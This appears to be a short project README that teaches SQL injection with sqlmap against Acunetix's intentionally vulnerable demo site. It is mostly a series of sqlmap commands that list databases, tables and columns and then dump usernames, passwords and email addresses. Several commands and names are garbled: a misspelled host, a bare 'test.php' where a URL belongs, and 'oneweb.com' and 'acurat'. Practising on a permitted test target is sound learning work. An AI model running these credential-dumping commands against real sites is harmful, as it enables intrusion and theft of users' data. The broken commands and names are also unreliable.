# Linux-Project--Website-Database-Hacking-using-sqlmap-tool-
Website Database Hacking using sqlmap tool 

We will be working on a sample website https://testphp.vulnweb.com/   to demonstrate SQL injection techniques, attacking a live website without permission is illegal. This https://testphp.vulnweb.com/  website we'll use is oneweb.com, which is provided by Acunetix. On this https://testphp.vulnweb.com/ , navigate to the URL.

Identify Databases:
sqlmap -u "testphp.vulneb.com/artists.php?artist=1" --dbs
This command checks the website for SQL injection vulnerabilities and lists the names of databases if found.

Find Tables in a Specific Database:
sqlmap -u "test.php" -D acurat --tables
This command lists all tables within the specified database, acurat.

Find Columns in a Specific Table:
sqlmap -u "test.php" -D acurat -T users --columns
This command lists all column names in the users table of the acurat database.

Retrieve Username Data:
sqlmap -u "test.php" -D acurat -T users -C uname --dump
This command extracts data from the uname column in the users table, retrieving usernames.


Retrieve Password Data:
sqlmap -u "test.php" -D acurat -T users -C pass --dump
This command extracts data from the pass column in the users table, retrieving passwords.

Retrieve Email Data:
sqlmap -u "test.php" -D acurat -T users -C email --dump
This command extracts data from the email column in the users table, retrieving email addresses.

These commands demonstrate how SQLMap can be used to test for SQL injection vulnerabilities, list database and table structures, and retrieve sensitive information from a database.
